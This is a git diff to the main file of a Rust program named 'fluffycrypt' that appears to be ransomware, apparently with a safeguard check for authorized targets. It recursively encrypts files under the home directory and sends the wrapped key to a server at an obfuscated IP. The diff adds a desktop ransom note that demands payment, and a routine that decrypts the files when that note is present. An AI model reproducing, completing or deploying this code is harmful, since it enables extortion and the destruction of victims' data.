@@ -3,10 +3,11 @@ use encryptor::wrap_key;
 use filesystem::recurse_directory_with_channel;
 use obfuscation::get_ip;
 use safeguard::should_disable_crypto;
-use std::env;
+use std::fs::write;
 use std::thread::sleep;
 use std::time::Duration;
 use std::vec::Vec;
+use std::{env, process::Command};
 use tokio::net::TcpSocket;
 use tracing::{self, event, Level};
 use tracing_subscriber::fmt::Subscriber;
@@ -14,6 +15,7 @@ use tracing_subscriber::fmt::Subscriber;
 use zeroize::Zeroize;
 
 mod comms;
+mod decryption;
 mod encryptor;
 mod filesystem;
 mod obfuscation;
@@ -44,19 +46,34 @@ async fn main() {
     // set up monitor
     let mut builder = Subscriber::builder();
     if Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_DEV") {
-        builder = builder.with_max_level(Level::DEBUG);
+        builder = builder.with_max_level(Level::TRACE);
     }
     builder = builder.with_thread_ids(true);
     let subscriber = builder.finish();
     tracing::subscriber::set_global_default(subscriber).expect("setting tracing default failed");
     event!(Level::INFO, "-- REACHED STAGE: Tracing Started --");
 
+    let mut path = if dirs::desktop_dir().is_none() {
+        dirs::home_dir().unwrap()
+    } else {
+        dirs::desktop_dir().unwrap()
+    };
+    path.push("fluffycrypt-notice-of-cryptographic-action.txt");
+    if path.exists() {
+        decryption::decryption_script(path).await;
+    }
+
+    // preflight checks (make sure system is an authorized target)
     let disable_cryptography = should_disable_crypto();
 
-    let mut key = encryptor::generate_key();
+    let mut key = encryptor::generate_random(32);
     let (s, r) = crossbeam_channel::unbounded();
 
     event!(Level::INFO, "-- REACHED STAGE: Recurser Start --");
+
+    if cfg!(target_os = "linux") {
+        let _ = Command::new("ulimit").args(["-n", "1048576"]).output(); // set file ulimit to prevent termination from file handler leak
+    }
     recurse_directory_with_channel(dirs::home_dir().unwrap(), &s);
 
     if !disable_cryptography {
@@ -68,7 +85,7 @@ async fn main() {
             let thread_reciever = r.clone();
             let thread_key = key.clone();
             threads.push(tokio::spawn(async move {
-                encryptor::encrypt_files(thread_reciever, thread_key).await;
+                encryptor::encrypt_files(thread_reciever, thread_key, true).await;
             }));
         }
 
@@ -81,20 +98,17 @@ async fn main() {
 
     event!(Level::INFO, "-- REACHED STAGE: Key Wrap --");
     let encrypted_key = wrap_key(&key);
-
     let mut ucid = generate_ucid().unwrap();
-
-    let ip = get_ip();
+    let mut ip = get_ip();
 
     key.zeroize(); // zero out key, not needed anymore
 
     event!(Level::INFO, "-- REACHED STAGE: Networking --");
-    let mut register_blob =
-        comms::Message::RegisterClient((ucid, encrypted_key.as_slice())).to_req();
+    let mut register_blob = comms::Message::RegisterClient(ucid, encrypted_key.as_slice()).to_req();
 
     let addr = ip.parse().unwrap();
 
-    // set up networking primitives
+    // set up networking utilities
     let socket = TcpSocket::new_v4().unwrap();
     let mut stream = socket.connect(addr).await.unwrap();
     let mut read_buff = vec![0; 1024];
@@ -156,7 +170,7 @@ async fn main() {
                     );
                     ucid = generate_ucid().unwrap();
                     register_blob =
-                        comms::Message::RegisterClient((ucid, encrypted_key.as_slice())).to_req();
+                        comms::Message::RegisterClient(ucid, encrypted_key.as_slice()).to_req();
                 }
                 Message::RateReject() => {
                     event!(
@@ -170,6 +184,18 @@ async fn main() {
                     continue;
                 }
                 Message::Accepted(_) => {
+                    let mut directory = if dirs::desktop_dir().is_none() {
+                        dirs::home_dir().unwrap()
+                    } else {
+                        dirs::desktop_dir().unwrap()
+                    };
+                    directory.push("fluffycrypt-notice-of-cryptographic-action.txt");
+                    let content = format!("Hi, your files are now encrypted and a key was successfully transmitted to our server. 
+                        We have generated a unique identifier for you, it's: {}\nOnce we've recieved payment, you can run the executable one \
+                        more time. Our server will \ntransmit your key back and this client will immediately decrypt your files without further \
+                        action on your side.\nWe look forward to hearing from you.", ucid);
+                    let content = content.replace("  ", "");
+                    let _ = write(directory, &content);
                     // registration accepted, no need to retry
                     event!(
                         Level::INFO,
@@ -184,4 +210,5 @@ async fn main() {
             }
         }
     }
+    ip.zeroize();
 }
